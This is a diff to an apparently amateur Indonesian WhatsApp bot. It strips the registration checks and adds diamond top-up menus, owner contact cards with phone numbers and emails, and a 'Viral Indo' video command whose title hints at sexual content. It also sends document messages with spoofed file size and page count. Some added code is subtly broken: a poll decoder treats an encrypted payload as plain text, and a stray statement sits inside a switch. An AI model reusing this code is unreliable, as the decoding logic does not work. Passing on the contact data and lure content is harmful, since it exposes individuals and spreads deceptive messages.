 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebaknegara.json'));
 				let {
@@ -7892,7 +16886,7 @@ break;
 			}
 			break
 			case 'link2img': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     if (!text) return sycreply('Masukkan link gambar yang valid!');
     if (!/^https?:\/\//.test(text)) return sycreply('Masukkan link gambar yang valid!');
     
@@ -7917,7 +16911,7 @@ break;
 }
 break;
 			case 'tebakepep': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (iGame(tebakepep, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!');
 				try {
 					// Mengambil data dari API
@@ -7959,7 +16953,7 @@ break;
 			}
 			break;
 			case 'tebakgambar': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (iGame(tebakgambar, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakgambar.json'));
 				let {
@@ -7983,7 +16977,7 @@ break;
 			}
 			break
 			case 'tebakbendera': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (iGame(tebakbendera, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakbendera.json'));
 				let {
@@ -8008,7 +17002,7 @@ break;
 			break
 			case 'kuismath':
 			case 'math': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const {
 					genMath,
 					modes
@@ -8040,7 +17034,7 @@ break;
 			}
 			break
 			case 'pler': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     // Emoji yang akan digunakan
 const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];
 
@@ -8273,7 +17267,7 @@ quoted: m
 break
     case 'gamemenu':
     case 'gemmenu': {
-        if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+         
     const gmenu = `
 ${ucapanWaktu} @${m.sender.split('@')[0]}
 
@@ -8327,7 +17321,7 @@ await sych.sendMessage(m.chat, {
 break
 case 'funmenu': 
 case 'fmenu': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
 const fmenu = `
 ${ucapanWaktu} @${m.sender.split('@')[0]}
 
@@ -8381,7 +17375,7 @@ await sych.sendMessage(m.chat, {
 break
     case 'toolsmenu':
     case 'toolmenu': {
-        if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+         
     const tlmenu = `
 ${ucapanWaktu} @${m.sender.split('@')[0]}
 
@@ -8465,7 +17459,7 @@ await sych.sendMessage(m.chat, {
 break
 case 'downloadmenu':
 case 'downmenu': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
 const downmenu = `
 ${ucapanWaktu} @${m.sender.split('@')[0]}
 
@@ -8511,7 +17505,7 @@ await sych.sendMessage(m.chat, {
 }    
     break
     case 'aimenu': {
-        if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+         
     const aimenu = `
 ${ucapanWaktu} @${m.sender.split('@')[0]}
 
@@ -8561,7 +17555,7 @@ await sych.sendMessage(m.chat, {
     break    
     case 'ownermenu':
     case 'ownmenu': {
-        if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+         
     const ownmenu = `
 ${ucapanWaktu} @${m.sender.split('@')[0]}
 
@@ -8638,7 +17632,7 @@ await sych.sendMessage(m.chat, {
     break    
     case 'groupmenu': 
     case 'grupmenu': {
-        if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+         
     const gcmenu = `
 ${ucapanWaktu} @${m.sender.split('@')[0]}
 
@@ -8697,7 +17691,7 @@ await sych.sendMessage(m.chat, {
 process.setMaxListeners(100000); // Tingkatkan batas listener jika diperlukan
 
 case 'beton': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     // Emoji yang akan digunakan
 const loadingTexts = ["█▒▒▒▒▒▒▒▒▒▒▒ 10%", "████▒▒▒▒▒▒▒▒ 30%", "███████▒▒▒▒▒ 50%", "██████████▒▒ 80%", "████████████ 100%", "> Done! Sabar agak delay soalnya pake termux wkwk"];
 let sentMessage;
@@ -8923,6 +17917,8 @@ try {
         },
         { quoted: fkontak }
     );
+// Log untuk mengecek struktur pesan sebelum dikirim
+console.log("Pesan yang akan dikirim:", JSON.stringify(msg, null, 2));
     // Kirim pesan
     await sych.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
 
@@ -8948,10 +17944,466 @@ await sych.sendMessage(m.chat, {
 
 break
 
+//topup
+case 'topup': {
+    let msg = generateWAMessageFromContent(from, {
+        viewOnceMessage: {
+            message: {
+                "messageContextInfo": {
+                    "deviceListMetadata": {},
+                    "deviceListMetadataVersion": 2
+                },
+                interactiveMessage: proto.Message.InteractiveMessage.create({
+                    body: proto.Message.InteractiveMessage.Body.create({
+                        text: Styles('Silahkan pilih *option* di bawah ini')
+                    }),
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                        text: '©Langz'
+                    }),
+                    header: proto.Message.InteractiveMessage.Header.create({
+                        title: ``,
+                        gifPlayback: true,
+                        subtitle: 'galang',
+                        hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/fbqpiy.jpeg" } }, { upload: sych.waUploadToServer }))
+ }),
+                    
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                        buttons: [
+                            {
+                                "name": "quick_reply",
+                                "buttonParamsJson": `{"display_text":"Pubg","id":"${prefix}pubg"}`
+                            },
+                            {
+                                "name": "quick_reply",
+                                "buttonParamsJson": `{"display_text":"Free Fire","id":"${prefix}ff"}`
+                            },
+                            {
+                                "name": "quick_reply",
+                                "buttonParamsJson": `{"display_text":"Mobile Legend","id":"${prefix}ml"}`
+                            }
+                        ],
+                    }),
+                    contextInfo: {
+                        mentionedJid: [m.sender],
+                        forwardingScore: 999,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                              newsletterName: 'Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦', 
+                              newsletterJid:'120363373320014871@newsletter',
+                            serverMessageId: 143
+                        }
+                    }
+                })
+            }
+        }
+    }, {});
+
+    await sych.relayMessage(msg.key.remoteJid, msg.message, {
+        messageId: msg.key.id
+    });
+}
+break
+
+case 'v1': {
+    let msg = generateWAMessageFromContent(from, {
+        viewOnceMessage: {
+            message: {
+                "messageContextInfo": {
+                    "deviceListMetadata": {},
+                    "deviceListMetadataVersion": 2
+                },
+                interactiveMessage: proto.Message.InteractiveMessage.create({
+                    body: proto.Message.InteractiveMessage.Body.create({
+                        text: `${n}Viral Indo 1${n}`
+                    }),
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                        text: `> Titile :\n\nG4k ku4t d1 hut4n d1 g45`
+                    }),
+                    header: proto.Message.InteractiveMessage.Header.create({
+                        title: ``,
+                        gifPlayback: true,
+                        subtitle: 'galang',
+                        hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: "https://Galangxyz.github.io/bkp/1.mp4" } }, { upload: sych.waUploadToServer }))
+ }),
+                    
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                        buttons: [
+                            
+                        ],
+                    }),
+                    contextInfo: {
+                        mentionedJid: [m.sender],
+                        forwardingScore: 999,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                              newsletterName: 'Powered By Galangxyz', 
+                              newsletterJid:'120363373320014871@newsletter',
+                            serverMessageId: 143
+                        }
+                    }
+                })
+            }
+        }
+    }, { quoted: memek });
+
+    await sych.relayMessage(msg.key.remoteJid, msg.message, {
+        messageId: msg.key.id
+    });
+}
+break
+
+
+//ml
+case 'mml': {
+let sections = [{
+title: 'Menu Sewa',
+highlight_label: 'Recomended',
+rows: [{
+title: '36 Diamond',
+description: `11K`, 
+id: `.pembayarandm`
+},
+{
+title: '44 Diamond',
+description: "12k", 
+id: `.pembayarandm`
+},
+{
+title: '56 Diamond', 
+description: "16k", 
+id: `.pembayarandm`
+},
+{
+title: '86 Diamond', 
+description: "23K", 
+id: `.pembayarandm`
+},
+{
+title: '112 Diamond', 
+description: "31K", 
+id: `.pembayarandm`
+},
+{
+title: '429 Diamond', 
+description: "109K", 
+id: `.pembayarandm`
+},
+{
+title: '600 Diamond', 
+description: "162K", 
+id: `.pembayarandm`
+}]
+}]
+
+let listMessage = {
+    title: 'Select Option', 
+    sections
+};
+
+let msg = generateWAMessageFromContent(m.chat, {
+ viewOnceMessage: {
+ message: {
+ "messageContextInfo": {
+ "deviceListMetadata": {},
+ "deviceListMetadataVersion": 2
+ },
+ interactiveMessage: proto.Message.InteractiveMessage.create({
+ contextInfo: {
+ mentionedJid: [m.sender], 
+ isForwarded: true, 
+ forwardedNewsletterMessageInfo: {
+ newsletterJid: '120363373320014871@newsletter',
+ newsletterName: 'Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦', 
+ serverMessageId: -1
+},
+ businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
+ }, 
+ body: proto.Message.InteractiveMessage.Body.create({
+ text: Styles(`Ayo Topup ml Skrng!!`)
+ }),
+ footer: proto.Message.InteractiveMessage.Footer.create({
+ text: `©Langz`
+ }),
+ header: proto.Message.InteractiveMessage.Header.create({
+ title: `*Hi @${sender.split("@")[0]} 👋*`,
+ subtitle: "",
+ hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/fbqpiy.jpeg" } }, { upload: sych.waUploadToServer }))
+ }),
+ nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+ buttons: [ 
+ {
+ "name": "single_select",
+"buttonParamsJson": JSON.stringify(listMessage)
+ },
+ ]
+ })
+ })
+ }
+ }
+}, {})
+
+await sych.relayMessage(msg.key.remoteJid, msg.message, {
+ messageId: msg.key.id
+})}
+break
+//ff
+case 'ff': {
+let sections = [{
+title: 'Menu Sewa',
+highlight_label: 'Recomended',
+rows: [{
+title: '70 Diamond',
+description: `10K`, 
+id: `.pembayarandm`
+},
+{
+title: '100 Diamond',
+description: "15k", 
+id: `.pembayarandm`
+},
+{
+title: '140 Diamond', 
+description: "20k", 
+id: `.pembayarandm`
+},
+{
+title: '210 Diamond', 
+description: "30k", 
+id: `.pembayarandm`
+},
+{
+title: '355 Diamond', 
+description: "47K", 
+id: `.pembayarandm`
+},
+{
+title: '1000 Diamond', 
+description: "131K", 
+id: `.pembayarandm`
+},
+{
+title: '1450 Diamons', 
+description: "182K", 
+id: `.pembayarandm`
+}]
+}]
+
+let listMessage = {
+    title: 'Select Option', 
+    sections
+};
+
+let msg = generateWAMessageFromContent(m.chat, {
+ viewOnceMessage: {
+ message: {
+ "messageContextInfo": {
+ "deviceListMetadata": {},
+ "deviceListMetadataVersion": 2
+ },
+ interactiveMessage: proto.Message.InteractiveMessage.create({
+ contextInfo: {
+ mentionedJid: [m.sender], 
+ isForwarded: true, 
+ forwardedNewsletterMessageInfo: {
+ newsletterJid: '120363373320014871@newsletter',
+ newsletterName: 'Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦', 
+ serverMessageId: -1
+},
+ businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
+ }, 
+ body: proto.Message.InteractiveMessage.Body.create({
+ text: Styles(`Ayo Topup ff Skrng!!`)
+ }),
+ footer: proto.Message.InteractiveMessage.Footer.create({
+ text: `©Langz`
+ }),
+ header: proto.Message.InteractiveMessage.Header.create({
+ title: `*Hi @${sender.split("@")[0]} 👋*`,
+ subtitle: "",
+ hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/fbqpiy.jpeg" } }, { upload: sych.waUploadToServer }))
+ }),
+ nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+ buttons: [ 
+ {
+ "name": "single_select",
+"buttonParamsJson": JSON.stringify(listMessage)
+ },
+ ]
+ })
+ })
+ }
+ }
+}, {})
+
+await sych.relayMessage(msg.key.remoteJid, msg.message, {
+ messageId: msg.key.id
+})}
+break
+//pubg
+case 'pubg': {
+let sections = [{
+title: 'Menu Sewa',
+highlight_label: 'Recomended',
+rows: [{
+title: '70 uc',
+description: `21K`, 
+id: `.pembayarandm`
+},
+{
+title: '100 uc',
+description: "27k", 
+id: `.pembayarandm`
+},
+{
+title: '125 uc', 
+description: "33k", 
+id: `.pembayarandm`
+},
+{
+title: '200 uc', 
+description: "47K", 
+id: `.pembayarandm`
+},
+{
+title: '300 uc', 
+description: "67K", 
+id: `.pembayarandm`
+},
+{
+title: '500 uc', 
+description: "102K", 
+id: `.pembayarandm`
+},
+{
+title: '750 uc', 
+description: "154K", 
+id: `.pembayarandm`
+}]
+}]
+
+let listMessage = {
+    title: 'Select Option', 
+    sections
+};
+
+let msg = generateWAMessageFromContent(m.chat, {
+ viewOnceMessage: {
+ message: {
+ "messageContextInfo": {
+ "deviceListMetadata": {},
+ "deviceListMetadataVersion": 2
+ },
+ interactiveMessage: proto.Message.InteractiveMessage.create({
+ contextInfo: {
+ mentionedJid: [m.sender], 
+ isForwarded: true, 
+ forwardedNewsletterMessageInfo: {
+ newsletterJid: '120363373320014871@newsletter',
+ newsletterName: 'Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦', 
+ serverMessageId: -1
+},
+ businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
+ }, 
+ body: proto.Message.InteractiveMessage.Body.create({
+ text: Styles(`Ayo Topup pubgl Skrng!!`)
+ }),
+ footer: proto.Message.InteractiveMessage.Footer.create({
+ text: `©Langz`
+ }),
+ header: proto.Message.InteractiveMessage.Header.create({
+ title: `*Hi @${sender.split("@")[0]} 👋*`,
+ subtitle: "",
+ hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/fbqpiy.jpeg" } }, { upload: sych.waUploadToServer }))
+ }),
+ nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+ buttons: [ 
+ {
+ "name": "single_select",
+"buttonParamsJson": JSON.stringify(listMessage)
+ },
+ ]
+ })
+ })
+ }
+ }
+}, {})
+
+await sych.relayMessage(msg.key.remoteJid, msg.message, {
+ messageId: msg.key.id
+})}
+break
+//pembayaran
+case 'pembayarandm': {
+sycreply(`Jika Sudah Transfer Silahkan Tekan Tombol Owner Di Bawah Dan Ketik Id Sesuai Game di private chat owner Contoh : 
+FF : 12344××××
+ML : 12355×××× ( 2828282 )
+PUBG : 282828×××`)
+    let msg = generateWAMessageFromContent(from, {
+        viewOnceMessage: {
+            message: {
+                "messageContextInfo": {
+                    "deviceListMetadata": {},
+                    "deviceListMetadataVersion": 2
+                },
+                interactiveMessage: proto.Message.InteractiveMessage.create({
+                    body: proto.Message.InteractiveMessage.Body.create({
+                        text: 'Silahkan pilih *option* di bawah ini'
+                    }),
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                        text: '©Langz'
+                    }),
+                    header: proto.Message.InteractiveMessage.Header.create({
+                        title: ``,
+                        gifPlayback: true,
+                        subtitle: `${owname}`,
+                        hasMediaAttachment: false
+                    }),
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                        buttons: [
+                            {
+                                "name": "quick_reply",
+                                "buttonParamsJson": `{"display_text":"Dana","id":"${prefix}dana"}`
+                            },
+                            {
+                                "name": "quick_reply",
+                                "buttonParamsJson": `{"display_text":"Qris","id":"${prefix}qris"}`
+                            },
+                            {
+                                "name": "quick_reply",
+                                "buttonParamsJson": `{"display_text":"owner","id":"${prefix}owner"}`
+                            }
+                        ],
+                    }),
+                    contextInfo: {
+                        mentionedJid: [m.sender],
+                        forwardingScore: 999,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterName: 'Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦',
+                            newsletterJid: '120363373320014871@newslatter',
+                            serverMessageId: 143
+                        }
+                    }
+                })
+            }
+        }
+    }, {});
+
+    await sych.relayMessage(msg.key.remoteJid, msg.message, {
+        messageId: msg.key.id
+    });
+}
+break
+
+
+
+
+
+
 
 
 case 'tobrut': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     // Emoji yang akan digunakan
     const loadingTexts = [
         "Loading.",
@@ -9072,7 +18524,7 @@ break;
 
 
 case 'donasi': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
 
 try {
     const carouselCards = [
@@ -9235,9 +18687,385 @@ try {
 }
 break;
 }
+
+// Fungsi untuk mendekode polling yang dipilih
+const decodeVote = (vote) => {
+    // Debug: Melihat nilai encPayload dalam Base64
+    const encodedPayloadBase64 = Buffer.from(vote.encPayload).toString('base64');
+    console.log("Base64 Encoded Payload:", encodedPayloadBase64);  // Debug
+
+    // Melakukan decode menjadi string UTF-8
+    const decodedPayload = Buffer.from(vote.encPayload).toString('utf8');
+    console.log("Decoded Payload:", decodedPayload);  // Debug
+
+    return decodedPayload; // Kembalikan hasil decode
+};
+
+// Handler untuk event polling update
+case 'pollupdate': {
+    if (m.message.pollUpdateMessage) {
+        const pollUpdate = m.message.pollUpdateMessage;
+
+        // Debug: Menampilkan seluruh polling update
+        console.log("Poll Update:", pollUpdate);
+
+        // Ambil nilai encPayload dan lakukan decoding
+        const selectedOption = decodeVote(pollUpdate.vote); // Dekode pilihan polling
+        console.log("Decoded Option:", selectedOption);  // Debug: Melihat hasil decode
+
+        // Jalankan aksi berdasarkan opsi polling yang dipilih
+        switch (selectedOption.toLowerCase()) {
+            case 'm1':
+                let allMenu = `┌──⭓ *All Menu*\n│\n${
+                    allCmd.sort((a, b) => a.localeCompare(b))
+                        .map((v) => `│⭔ ${prefix}${v}`).join('\n')
+                }\n│\n└───────⭓`;
+                sych.reply(m.chat, allMenu);
+                break;
+
+            case 'menugroup':
+                let groupMenu = `┌──⭓ *Group Menu*\n│\n${
+                    cmdGrup.sort((a, b) => a.localeCompare(b))
+                        .map((v) => `│⭔ ${prefix}${v}`).join('\n')
+                }\n│\n└───────⭓`;
+                sych.reply(m.chat, groupMenu);
+                break;
+
+            case 'menudownload':
+                let downloadMenu = `┌──⭓ *Downloader Menu*\n│\n${
+                    cmdDown.sort((a, b) => a.localeCompare(b))
+                        .map((v) => `│⭔ ${prefix}${v}`).join('\n')
+                }\n│\n└───────⭓`;
+                sych.reply(m.chat, downloadMenu);
+                break;
+
+            case 'menusearch':
+                let searchMenu = `┌──⭓ *Search Menu*\n│\n${
+                    cmdSearch.sort((a, b) => a.localeCompare(b))
+                        .map((v) => `│⭔ ${prefix}${v}`).join('\n')
+                }\n│\n└───────⭓`;
+                sych.reply(m.chat, searchMenu);
+                break;
+
+            case 'menuowner':
+                let ownerMenu = `┌──⭓ *Owner Menu*\n│\n${
+                    cmdOwner.sort((a, b) => a.localeCompare(b))
+                        .map((v) => `│⭔ ${prefix}${v}`).join('\n')
+                }\n│\n└───────⭓`;
+                sych.reply(m.chat, ownerMenu);
+                break;
+
+            // Tambahkan case lain sesuai kebutuhan...
+
+            default:
+                sych.reply(m.chat, 'Pilihan tidak valid.');
+                break;
+        }
+    }
+    break;
+}
+
+
+
+
+case 'pepek': {
+    // Hapus pesan sebelumnya jika ada
+    if (global.lastMessageId) {
+        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
+    }
+
+    // Data kontak owner
+    let ownerContacts = [
+        {
+            name: "Langz",
+            phone: "50251731838", // Nomor telepon tanpa + atau 0 di awal
+            email: "wibukntl858@gmail.com", // Email owner
+            region: "Indonesia", // Region atau lokasi
+            website: "https://profile.galng.my.id/", // Website owner
+            description: "Admin Utama"
+        },
+        {
+            name: "Langz 2",
+            phone: "17089003182",
+            email: "fplang89@gmail.com",
+            region: "USA",
+            website: "https://code.mataberita.com",
+            description: "Admin Cadangan"
+        }
+    ];
+
+    // Gabungkan semua vCard menjadi satu pesan
+    let vCards = ownerContacts.map(contact => 
+        `BEGIN:VCARD\nVERSION:3.0\nFN:${contact.name}\nTEL;type=CELL;type=VOICE;waid=${contact.phone}:${contact.phone}\nEMAIL;type=INTERNET:${contact.email}\nADR;type=WORK:;;${contact.region};;;;\nURL:${contact.website}\nNOTE:${contact.description}\nEND:VCARD`
+    ).join('\n');
+
+    // Kirim pesan dengan semua kontak
+    let sentMsg = await sych.sendMessage(m.chat, {
+        contacts: {
+            displayName: 'Kontak Owner',
+            contacts: ownerContacts.map(contact => ({
+                displayName: contact.name,
+                vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${contact.name}\nTEL;type=CELL;type=VOICE;waid=${contact.phone}:${contact.phone}\nEMAIL;type=INTERNET:${contact.email}\nADR;type=WORK:;;${contact.region};;;;\nURL:${contact.website}\nNOTE:${contact.description}\nEND:VCARD`
+            }))
+        }
+    }, { quoted: fkontak }); // Opsi mengutip pesan sebelumnya (opsional)
+
+    // Simpan ID pesan terkirim untuk penghapusan otomatis pesan berikutnya
+    global.lastMessageId = sentMsg.key.id; // Simpan ID pesan yang baru saja dikirim
+    break;
+}
+
+
+
+
+
+
+
+//donate
+
+case 'kontol': {
+let profile;
+				try {
+					profile = await sych.profilePictureUrl(m.sender, 'image');
+				} catch (e) {
+					profile = fake.anonim;
+				}
+
+    let menu = `*_👋🏻 *Hello! I am Langz Bot Version 9999.*  
+Ready products like nokos, and many more! Designed with precision and care, I ensure your experience is seamless and efficient.  
+
+╭───❐ *I N F O R M A S I* ❐───✧  
+├ 📜 *Bot Name* : Langz 
+├ 👨‍💻 *Owner* : Galang  
+├ 🌐 *Version* : 9999  
+├ 🛒 *Product* : Nokos  
+╰─────────────────────✧  
+
+💡 *Feel free to explore all my features using the menu provided!*  
+🔰 Powered by Galangz _*`;
+
+    // Tombol utama
+    let buttons = [
+        { buttonId: ".bot mode self", buttonText: { displayText: " Self " }, type: 1 },
+        { buttonId: ".bot mode public", buttonText: { displayText: " Public " }, type: 1 }
+        
+    ];
+
+    // Pesan dengan media video
+    let buttonMessage = {
+    document: fake.docs,
+        fileName: ucapanWaktu,
+        mimetype: pickRandom(fake.listfakedocs),
+        fileLength: '100000000000000',
+        pageCount: '999',        image: {
+            url: "https://Galangxyz.github.io/bkp/3f25bf7ebbfb84ecbc3bdb2d1da8bdf2.jpg", // Pastikan file ini tersedia
+            gifPlayback: true
+        },
+        caption: `${menu}`, // Teks menu
+        contextInfo: {
+            forwardingScore: 999,
+            isForwarded: true,
+            externalAdReply: {
+                title: "Bot Status",
+                body: "🟢 Active",
+                thumbnailUrl: "https://Galangxyz.github.io/bkp/3f25bf7ebbfb84ecbc3bdb2d1da8bdf2.jpg",
+                mediaType: 1,
+                renderLargerThumbnail: true,
+                previewType: 0,
+             
+                mediaUrl: my.gh,
+                sourceUrl: my.gh
+            }
+        },
+        footer: "© Langz",
+        buttons: buttons,
+        viewOnce: true,
+        headerType: 4
+    };
+
+    // Tambahan flow actions
+    // Bagian Sections
+let sections = [
+    {
+        title: 'Select Menu',
+        highlight_label: 'Powered by Galangz',
+        rows: [
+            {
+                title: `${prefix}Allmenu`,
+                description: `Daftar semua menu yang tersedia.`,
+                id: `${prefix}allmenu`
+            },
+            {
+                title: `${prefix}Downloadmenu`,
+                description: `Menu untuk mendownload media.`,
+                id: `${prefix}downloadmenu`
+            },
+            {
+                title: `${prefix}Ownermenu`,
+                description: `Menu khusus untuk owner.`,
+                id: `${prefix}ownermenu`
+            },
+            {
+                title: `${prefix}Groupmenu`,
+                description: `Menu untuk pengelolaan grup.`,
+                id: `${prefix}groupmenu`
+            },
+            {
+                title: `${prefix}Funmenu`,
+                description: `Menu hiburan dengan berbagai fitur.`,
+                id: `${prefix}funmenu`
+            },
+            {
+                title: `${prefix}Gamemenu`,
+                description: `Menu untuk bermain game.`,
+                id: `${prefix}gamemenu`
+            },
+            {
+                title: `${prefix}Aimenu`,
+                description: `Menu AI dan fitur kecerdasan buatan.`,
+                id: `${prefix}aimenu`
+            },
+            {
+                title: `${prefix}Toolsmenu`,
+                description: `Menu berisi berbagai tools.`,
+                id: `${prefix}toolsmenu`
+            }
+        ]
+    }
+];
+
+// Membuat List Message
+let listMessage = {
+    title: 'Select Menu',
+    sections
+};
+
+// Output ke Flow Actions
+const flowActions = [
+    {
+        buttonId: 'action',
+        buttonText: { displayText: 'Pilih Menu' },
+        type: 4,
+        nativeFlowInfo: {
+            name: 'single_select',
+            paramsJson: JSON.stringify(listMessage)
+        },
+        viewOnce: true
+    },
+];
+
+
+    // Tambahkan flowActions ke buttonMessage
+    buttonMessage.buttons.push(...flowActions);
+
+    // Kirim pesan
+    await sych.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
+    break;
+}
+
+
+//galang kontol
+case 'for': {
+    // Hapus pesan sebelumnya jika ada
+    if (global.lastMessageId) {
+        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
+    }
+
+  let listMessage = {
+    text: "Please fill in the form below: \n\n- Name: [Input Field] \n- Email: [Input Field] \n- Feedback: [Input Field]",
+    footer: "Fill out the form and submit",
+    title: "Form Submission"
+};
+
+let sections = [
+    {
+        title: "Form Fields",
+        rows: [
+            {
+                title: "Enter Your Name",
+                description: "Please provide your full name.",
+                id: "input_name"
+            },
+            {
+                title: "Enter Your Email",
+                description: "Please provide your email address.",
+                id: "input_email"
+            },
+            {
+                title: "Enter Your Feedback",
+                description: "Please provide your feedback or comments.",
+                id: "input_feedback"
+            }
+        ]
+    },
+    {
+        title: "Form Submission",
+        rows: [
+            {
+                title: "Submit Form",
+                description: "Click to submit your filled form.",
+                id: "submit_form"
+            }
+        ]
+    }
+];
+
+let msg = generateWAMessageFromContent(m.chat, {
+    viewOnceMessage: {
+        message: {
+            "messageContextInfo": {
+                "deviceListMetadata": {},
+                "deviceListMetadataVersion": 2
+            },
+            interactiveMessage: proto.Message.InteractiveMessage.create({
+                contextInfo: {
+                    mentionedJid: [m.sender],
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363373320014871@newsletter',
+                        newsletterName: 'Powered By Galangxyz',
+                        serverMessageId: -1
+                    },
+                    businessMessageForwardInfo: {
+                        businessOwnerJid: sych.decodeJid(sych.user.id)
+                    },
+                },
+                body: proto.Message.InteractiveMessage.Body.create({
+                    text: listMessage.text
+                }),
+                footer: proto.Message.InteractiveMessage.Footer.create({
+                    text: listMessage.footer
+                }),
+                header: proto.Message.InteractiveMessage.Header.create({
+                    title: listMessage.title,
+                    subtitle: "",
+                    hasMediaAttachment: false
+                }),
+                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                    buttons: [{
+                        name: "single_select",
+                        buttonParamsJson: JSON.stringify({
+                            display_text: listMessage.text,
+                            id: listMessage.id
+                        })
+                    }]
+                })
+            })
+        }
+    }
+}, { quoted: fkontak });
+
+// Simpan ID pesan terkirim untuk penghapusan otomatis
+global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim
+
+await sych.relayMessage(msg.key.remoteJid, msg.message, {
+    messageId: msg.key.id
+});
+    break;
+}
 			// Menu
-			case 'allmenu': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			case 'allmenuu': {
+			     
 
 // Emoji yang akan digunakan
 const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];
@@ -9529,79 +19357,92 @@ ${f}*Jam* : ${jam} WIB
 │${setv} >
 │${setv} <
 ╰──────❍`;
-				await sych.sendMessage(m.chat, {
-    document: fake.docs,
-    fileName: ucapanWaktu,
-    mimetype: pickRandom(fake.listfakedocs),
-    fileLength: '100000000000000',
-    pageCount: '999',
-    caption: menunya,
-    buttons: [{
-        buttonId: `${prefix}pushkontak2`,
-        buttonText: {
-            displayText: "PushKontak2"
-        }
-    }, {
-        buttonId: `${prefix}list`,
-        buttonText: {
-            displayText: "List GC"
-        }
-    },{
-    buttonId: `${prefix}pler`,
-        buttonText: {
-            displayText: "PushKontak2"
-        }
-    }, {
-        buttonId: `${prefix}pepek`,
-        buttonText: {
-            displayText: "List GC"
-        }
-    }
-    
+				 
+    // Mengirim dokumen dengan tombol
+    await sych.sendMessage(m.chat, {
+        document: fake.docs,
+        fileName: ucapanWaktu,
+        mimetype: pickRandom(fake.listfakedocs),
+        fileLength: '100000000000000',
+        pageCount: '999',
+        caption: menunya,
+        buttons: [
